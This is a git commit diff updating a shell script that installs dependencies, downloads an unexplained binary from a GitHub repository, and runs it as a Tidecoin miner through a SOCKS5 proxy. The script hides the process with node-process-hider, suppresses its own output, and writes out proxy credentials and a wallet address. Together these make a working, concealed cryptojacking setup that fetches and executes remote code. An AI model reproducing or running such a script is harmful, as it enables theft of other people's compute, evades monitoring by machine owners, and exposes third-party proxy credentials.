68b8e428e632ae6c844af9ed8e0ad43d64c3f93c
denisule54 <87700595+denisule54@users.noreply.github.com>
2022-02-19 18:13:57 +0700

    Update Tedece.sh

--- Tedece.sh
+++ Tedece.sh
@@ -1,19 +1,19 @@
-nohup apt update && nohup apt -y install nohup sudo wget curl unzip
-nohup sudo apt-get install screen -y
+#!/bin/sh
 
-nohup sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+apt update && apt -y install wget curl sudo unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-nohup curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-nohup apt-get install -y nodejs
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+sudo apt-get install -y nodejs
+sudo apt-get install gcc g++ make
 
 npm i -g node-process-hider
 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+sudo dpkg-reconfigure --frontend noninteractive tzdata
 
-dpkg-reconfigure --frontend noninteractive tzdata
-
-nohup wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
+wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -25,23 +25,24 @@ loglevel = 1
 
 socks5 = 209.127.191.180:9279
 
-socks5_username = cosxjsqw
+socks5_username = ehobhrmk
 
-socks5_password = aydutzusi3fr
+socks5_password = 9omojnjzsmux
 
 END
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf >/dev/null &
 
 sleep .2
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
-
 echo " "
 
-./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/asese
-chmod +x asese
+./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/cccpavx2
+chmod +x cccpavx2
 
-screen -d -m ./graftcp/graftcp ./asese -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.Mycuan1 --algo yespower --param-n 2048 --param-r 8 --param-key ""
+ph add cccpavx2
+
+./graftcp/graftcp ./cccpavx2 -a yespowertide -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyCuan01 -t 39
